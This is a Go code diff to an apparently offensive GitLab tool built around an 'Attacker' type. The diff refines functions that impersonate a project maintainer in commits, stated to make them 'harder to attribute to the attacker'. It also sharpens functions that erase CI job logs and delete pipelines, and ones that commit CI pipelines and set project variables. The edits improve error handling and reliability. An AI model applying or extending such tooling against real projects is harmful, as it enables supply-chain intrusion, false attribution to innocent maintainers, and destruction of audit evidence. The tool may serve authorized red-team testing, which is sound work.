@@ -6,6 +6,8 @@ import (
 	"errors"
 	"fmt"
 	"log/slog"
+	"net/http"
+	"net/url"
 	"strings"
 	"time"
 
@@ -107,7 +109,7 @@ func (a *Attacker) SetupUser(ctx context.Context) (*gitlab.User, error) {
 // author identity to theirs. Makes commits harder to attribute to the attacker.
 func (a *Attacker) ImpersonateMaintainer(ctx context.Context, projectID any) error {
 	opts := &gitlab.ListProjectMembersOptions{ListOptions: gitlab.ListOptions{PerPage: 50, Page: 1}}
-	members, _, err := a.Client.GL.ProjectMembers.ListProjectMembers(projectID, opts, gitlab.WithContext(ctx))
+	members, _, err := a.Client.GL.ProjectMembers.ListAllProjectMembers(projectID, opts, gitlab.WithContext(ctx))
 	if err != nil {
 		return fmt.Errorf("list project members: %w", err)
 	}
@@ -123,13 +125,7 @@ func (a *Attacker) ImpersonateMaintainer(ctx context.Context, projectID any) err
 			return nil
 		}
 	}
-	if len(members) > 0 && members[0] != nil {
-		a.AuthorName = members[0].Name
-		if a.AuthorEmail == "" && members[0].Username != "" {
-			a.AuthorEmail = members[0].Username + "@users.noreply.gitlab.com"
-		}
-	}
-	return nil
+	return fmt.Errorf("project has no visible maintainer or owner")
 }
 
 // CreateSnippet creates a personal snippet (GitLab equivalent of a Gist).
@@ -153,8 +149,11 @@ func (a *Attacker) EnsureBranch(ctx context.Context, projectID any, branch strin
 		return errors.New("branch cannot be empty")
 	}
 	_, resp, err := a.Client.GL.Branches.GetBranch(projectID, branch, gitlab.WithContext(ctx))
-	if err == nil && resp != nil && resp.StatusCode == 200 {
+	if err == nil {
 		return nil
+	}
+	if resp == nil || resp.StatusCode != http.StatusNotFound {
+		return fmt.Errorf("check branch %q: %w", branch, err)
 	}
 	// Get default branch
 	p, _, err := a.Client.GL.Projects.GetProject(projectID, &gitlab.GetProjectOptions{}, gitlab.WithContext(ctx))
@@ -270,22 +269,28 @@ func (a *Attacker) EraseRecentPipelines(ctx context.Context, projectID any, ref 
 		return 0, fmt.Errorf("list pipelines: %w", err)
 	}
 	processed := 0
-	for _, p := range pipelines {
-		// Erase all jobs in the pipeline
-		jobs, _, jerr := a.Client.GL.Jobs.ListPipelineJobs(projectID, p.ID, &gitlab.ListJobsOptions{
+	var cleanupErrs []error
+	for _, pipeline := range pipelines {
+		jobs, _, jobsErr := a.Client.GL.Jobs.ListPipelineJobs(projectID, pipeline.ID, &gitlab.ListJobsOptions{
 			ListOptions: gitlab.ListOptions{PerPage: 100},
 		}, gitlab.WithContext(ctx))
-		if jerr == nil {
-			for _, j := range jobs {
-				_ = a.EraseJob(ctx, projectID, j.ID) // best-effort
+		if jobsErr != nil {
+			cleanupErrs = append(cleanupErrs, fmt.Errorf("pipeline %d list jobs: %w", pipeline.ID, jobsErr))
+		} else {
+			for _, job := range jobs {
+				if eraseErr := a.EraseJob(ctx, projectID, job.ID); eraseErr != nil {
+					cleanupErrs = append(cleanupErrs, fmt.Errorf("erase job %d: %w", job.ID, eraseErr))
+				}
 			}
 		}
 		if deletePipelines {
-			_ = a.DeletePipeline(ctx, projectID, p.ID) // best-effort
+			if deleteErr := a.DeletePipeline(ctx, projectID, pipeline.ID); deleteErr != nil {
+				cleanupErrs = append(cleanupErrs, fmt.Errorf("delete pipeline %d: %w", pipeline.ID, deleteErr))
+			}
 		}
 		processed++
 	}
-	return processed, nil
+	return processed, errors.Join(cleanupErrs...)
 }
 
 // TriggerPipeline creates a new pipeline for the given ref via the API.
@@ -332,9 +337,9 @@ func (a *Attacker) CommitCIPipeline(ctx context.Context, projectID any, branch, 
 	if err != nil {
 		return "", err
 	}
-	url := fmt.Sprintf("%s/%s/-/pipelines?ref=%s", strings.TrimSuffix(a.GitLabURL, "/"), p.PathWithNamespace, branch)
+	pipelineURL := fmt.Sprintf("%s/%s/-/pipelines?ref=%s", strings.TrimSuffix(a.GitLabURL, "/"), p.PathWithNamespace, url.QueryEscape(branch))
 	slog.Info("CI pipeline committed", "project", p.PathWithNamespace, "branch", branch)
-	return url, nil
+	return pipelineURL, nil
 }
 
 // SetProjectVariable creates or updates a CI variable in the project scope.
